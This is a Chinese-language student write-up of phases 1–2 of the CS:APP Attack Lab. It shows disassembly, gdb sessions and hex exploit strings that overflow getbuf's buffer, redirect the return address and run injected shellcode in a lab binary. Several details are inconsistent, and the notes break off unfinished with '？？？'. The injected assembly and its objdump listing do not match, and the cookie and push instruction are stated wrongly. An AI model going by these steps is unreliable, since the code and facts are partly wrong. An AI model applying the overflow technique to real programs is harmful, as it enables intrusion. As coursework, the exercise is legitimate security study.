# Attack Lab Notes

Phase 1 - 3：Code Injection attacks 代码注入攻击，是指向缓冲区填充数据时超过长度限制，导致覆盖了别的区域的数据，当覆盖了返回地址，并指向自己的攻击代码时便可以完成攻击的执行。

Phase 4 - 5：ROP attacks 攻击者扫描已有的动态链接库和可执行文件，提取出可以利用的指令片段(gadget)，这些指令片段均以ret指令结尾，利用ret结尾的程序片段 ，操作这些栈相关寄存器，控制程序的流程，执行相应的gadget，实施攻击者预设目标 。



## Phase 1

实验要求：不需要注入代码，CTARGET会调用 getbuf() 函数读取字符串，用户需要做的是填充字符串并覆盖返回地址，使代码重定向到 touch1() 函数。

```c
// attacklab.pdf 中关于getbuf以及touch1的提示：

void test()
{
    int val;
    val = getbuf();
    printf("No exploit. Getbuf returned 0x%x\n", val);
}


void touch1() {
    vlevel = 1; /* Part of validation protocol */      
    printf("Touch!: You called touch1()\n");
    validate(1);
    exit(0);
}
```

首先对CTARGET文件进行反汇编

```
objdump -d ctarget > ctarget.asm
```

得到两个关键函数的代码：

```asm
00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	callq  401a40 <Gets>
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	retq   
  4017be:	90                   	nop
  4017bf:	90                   	nop

00000000004017c0 <touch1>:
  4017c0:	48 83 ec 08          	sub    $0x8,%rsp
  4017c4:	c7 05 0e 2d 20 00 01 	movl   $0x1,0x202d0e(%rip)        # 6044dc <vlevel>
  4017cb:	00 00 00 
  4017ce:	bf c5 30 40 00       	mov    $0x4030c5,%edi
  4017d3:	e8 e8 f4 ff ff       	callq  400cc0 <puts@plt>
  4017d8:	bf 01 00 00 00       	mov    $0x1,%edi
  4017dd:	e8 ab 04 00 00       	callq  401c8d <validate>
  4017e2:	bf 00 00 00 00       	mov    $0x0,%edi
  4017e7:	e8 54 f6 ff ff       	callq  400e40 <exit@plt>
```

可以看到``sub    $0x28,%rsp``，说明在栈中开辟了0x28，即40个字节的长度用于存放字符串，touch1的函数地址是00000000004017c0，所以我们首先利用任意数字填充40字节，再跟上这一地址，即可完成攻击。



## phase 2

实验要求： 通过代码注入的方式抵达touch2,同时touch2中存在对参数的检查，传入参数需要与本地cookie.txt内的值相等。所以此次实验需要完成以下事情：

1. 将cookie的值推到rdi（存放参数的寄存器）中     
2. 修改返回地址以运行栈内的注入代码，注入的代码为使用ret跳转到touch2

```C
void touch2(unsigned val){
    vlevel = 2;
    if (val == cookie){
        printf("Touch2!: You called touch2(0x%.8x)\n", val);
        validate(2);
    } else {
        printf("Misfire: You called touch2(0x%.8x)\n", val);
        fail(2);
    }
    exit(0);
}
```

查看本地cookies.txt，可以得到cookie值为0x59b997fa，转换为16进制为35 39 62 39 39 37 66 61 00

查看反汇编代码，可以得到touch2的地址为00000000004017ec

```asm
00000000004017ec <touch2>:
  4017ec:	48 83 ec 08          	sub    $0x8,%rsp
  4017f0:	89 fa                	mov    %edi,%edx
  4017f2:	c7 05 e0 2c 20 00 02 	movl   $0x2,0x202ce0(%rip)        # 6044dc <vlevel>
  4017f9:	00 00 00 
  4017fc:	3b 3d e2 2c 20 00    	cmp    0x202ce2(%rip),%edi        # 6044e4 <cookie>
  401802:	75 20                	jne    401824 <touch2+0x38>
  401804:	be e8 30 40 00       	mov    $0x4030e8,%esi
  401809:	bf 01 00 00 00       	mov    $0x1,%edi
  40180e:	b8 00 00 00 00       	mov    $0x0,%eax
  401813:	e8 d8 f5 ff ff       	callq  400df0 <__printf_chk@plt>
  401818:	bf 02 00 00 00       	mov    $0x2,%edi
  40181d:	e8 6b 04 00 00       	callq  401c8d <validate>
  401822:	eb 1e                	jmp    401842 <touch2+0x56>
  401824:	be 10 31 40 00       	mov    $0x403110,%esi
  401829:	bf 01 00 00 00       	mov    $0x1,%edi
  40182e:	b8 00 00 00 00       	mov    $0x0,%eax
  401833:	e8 b8 f5 ff ff       	callq  400df0 <__printf_chk@plt>
  401838:	bf 02 00 00 00       	mov    $0x2,%edi
  40183d:	e8 0d 05 00 00       	callq  401d4f <fail>
  401842:	bf 00 00 00 00       	mov    $0x0,%edi
  401847:	e8 f4 f5 ff ff       	callq  400e40 <exit@plt>
```

编写注入代码：

```asm
movq    $0x5561dc78, %rdi   #写入cookie值保证touch2运行通过
pushq   0x4017ec			#ret从栈顶获取返回地址，这里填写touch2的地址
ret							
```

将代码写入文件，对文件进行编译、再反编译，可以得到指令序列

```powershell
$ gcc -c inject.s
$ objdump -d inject.o
```

```asm
inject.o:     file format elf64-x86-64

Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 c7 c7 fa 97 b9 59 	mov    $0x5561dc78,%rdi
   7:	ff 34 25 ec 17 40 00 	pushq  0x4017ec
   e:	c3                   	retq  
```

我们需要将48 c7 c7 fa 97 b9 59 ff 34 25 ec 17 40 00 c3这段指令推入栈顶，并且将getbuf函数的返回地址修改为栈顶地址，即可完成此次注入攻击。

由phase1可知，修改getbuf函数的返回地址，需要填充40个字节的任意数据，并跟上新的地址进行覆盖。因此接下来获取栈顶地址%rsp

```powershell
$ gdb ctarget

(gdb)> break getbuf
(gdb)> run -q
(gdb)> disas
=> 0x00000000004017a8 <+0>:     sub    $0x28,%rsp
   0x00000000004017ac <+4>:     mov    %rsp,%rdi
   0x00000000004017af <+7>:     callq  0x401a40 <Gets>
   0x00000000004017b4 <+12>:    mov    $0x1,%eax
   0x00000000004017b9 <+17>:    add    $0x28,%rsp
   0x00000000004017bd <+21>:    retq

(gdb)> stepi
(gdb) p /x $rsp
$1 = 0x5561dc78

得到栈顶地址为0x5561dc78，因此可以填充以下代码：

```
48 c7 c7 fa 97 b9 59 68 ec 17 
40 00 c3 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 00 00 
78 dc 61 55 00 00 00 00  
```



**？？？**







